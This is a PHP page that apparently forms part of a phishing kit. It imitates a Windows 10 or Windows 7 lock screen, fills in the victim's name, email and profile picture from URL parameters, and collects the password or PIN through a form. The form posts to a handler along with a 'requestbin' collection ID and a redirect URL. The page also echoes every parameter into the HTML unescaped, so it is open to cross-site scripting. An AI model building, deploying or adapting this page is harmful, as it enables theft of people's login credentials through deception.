<?php
  # Name --> Identify Person
  if (isset($_GET["name"])) {
    $name = $_GET["name"];
  } else {
    $name = "User";
  }
  # Type = "password" / "pin"
  if (isset($_GET["type"])) {
    $type = $_GET["type"];
  } else {
    $type = "password";
  }
  # Background
  if (isset($_GET["background"])) {
    $bg = $_GET["background"];
  } else {
    $bg = "../i/windows/img0.jpg";
  }
  # Profile
  if (isset($_GET["profile"])) {
    $profile = $_GET["profile"];
  } else {
    $profile = "../i/user.png";
  }
  # Custom Request Bin
  if (isset($_GET["requestbin"])) {
    $requestbin = $_GET["requestbin"];
  } else {
    $requestbin = "1kdhj9p1";
  }
  # Email --> user@domain.com
  if (isset($_GET["mail"])) {
    $mail = $_GET["mail"];
  } else {
    $mail = "";
  }
  # Return URL
  if (isset($_GET["return"])) {
    $return = $_GET["return"];
  } else {
    $return = "https://google.com";
  }
  # Operating System --> windows10 / windows7
  if (isset($_GET["os"])) {
    $os = $_GET["os"];
  } else {
    $os = "windows10";
  }
  $type = strtolower($type);
  if ($type == "pin") {
    $type = "PIN";
  } elseif ($type == "password") {
    $type = "Password";
  } else {
    $error = "True: Password/PIN";
  }
?>
<html>
<head>
  <title> Client </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
  .content {
    margin: 0;
    position: absolute;
    top: 50%;
    left: 50%;
    -ms-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
  }
  img {
    border-radius: 50%;
    width: 200px;
    height: 200px;
  }
  @font-face {
    font-family: font;
    src: url(../fonts/font.woff);
  }

  * {
    font-family: font;
    font-weight: 600;
  }
  body, html {
    height: 100%;
  }

  .bg {
    background-image: url(<?php echo $bg; ?>);

    height: 98%;

    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
  input[type="password"] {
    width: 200px;
    height: 35px;
    padding-right: 50px;
    padding-left: 13px;
    border: 0;
    outline: none;
  }

  input[type="submit"] {
    margin-left: -50px;
    height: 35px;
    width: 50px;
    color: black;
    border: 0;
    background-color: white;
    outline: none;
  }
  </style>
</head>
<body class="bg">
  <div class="content">
    <?php
    if (isset($profile)) {
      echo "<center><img src='$profile' alt='user'</center>";
    } else {

    }
    if (isset($name)) {
      echo "<center><h2>$name</h2></center>";
    } else {

    }
    if (isset($mail)) {
      echo "<center><p>$mail</p></center>";
    } else {

    }
    ?>
    <form action="../includes/post-password.inc.php" method="post">
      <input type="hidden" name="name" value="<?php echo $name; ?>">
      <input type="hidden" name="mail" value="<?php echo $mail; ?>">
      <input type="hidden" name="type" value="<?php echo $type; ?>">
      <input type="hidden" name="background" value="<?php echo $background; ?>">
      <input type="hidden" name="profile" value="<?php echo $profile; ?>">
      <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
      <input type="hidden" name="error" value="<?php echo $error; ?>">
      <input type="hidden" name="return" value="<?php echo $return; ?>">
      <input type="password" name="password" value="" placeholder="<?php echo $type; ?>" required>
      <input type="submit" name="password-submit" value="Next">
    </form>
  </div>
</body>
